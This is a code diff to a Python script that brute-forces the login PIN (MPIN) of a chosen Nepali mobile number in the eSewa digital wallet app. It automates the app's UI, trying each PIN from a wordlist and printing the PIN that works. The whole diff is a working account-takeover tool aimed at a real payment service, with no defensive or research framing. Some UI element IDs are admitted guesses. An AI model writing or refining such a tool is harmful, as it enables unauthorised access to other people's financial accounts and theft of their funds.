@@ -17,27 +17,38 @@ file = open('mpins.txt', 'r')
 
 MobileNumber = input('Enter Mobile Number: ').strip()
 print("Target Mobile Number (+977):", MobileNumber)
-print("\nTrying MPIN's from the list ...")
+print("\nTrying MPINs from the list ...")
 
 i = 0
 while True:
     passw = file.readline().strip()
-    i += 1
+    if not passw:
+        break  # Exit the loop if no more MPINs are in the file
+    
     if len(passw) < 4:
         continue
-    print(str(i) + " : " + passw)
+
+    print(str(i + 1) + " : " + passw)
+    
     try:
-        response = d(resourceId="com.f1soft.esewa:id/toolbar_login/register").click()
-        if response.status_code == 200:
-            d.select_form(nr=0)
-            d.form['MobileNumber'] = MobileNumber
-            d.form['MPIN'] = passw
-            response = d.submit()
-            response_data = response.read()
-            if 'response_data' in response_data:
-    decoded_response = response_data.decode('utf-8')  # Decoding response_data assuming it's encoded in UTF-8
-    print('Your MPIN is:', passw)
-    print('Response Data:', decoded_response)
-    break
-except Exception as e:
-    print('Error:', e)
+        # Assuming there are fields for entering the mobile number and MPIN
+        d(resourceId="com.f1soft.esewa:id/mobileNumberField").set_text(MobileNumber)
+        d(resourceId="com.f1soft.esewa:id/mpinField").set_text(passw)
+
+        # Click the login/submit button
+        d(resourceId="com.f1soft.esewa:id/loginButton").click()
+
+        # Add a delay to wait for the login response
+        d.sleep(2)
+
+        # Check if login was successful, based on some condition (modify as needed)
+        if d(resourceId="com.f1soft.esewa:id/loginSuccessMessage").exists:
+            print('Your MPIN is:', passw)
+            break
+
+    except Exception as e:
+        print('Error:', e)
+
+    i += 1
+
+file.close()
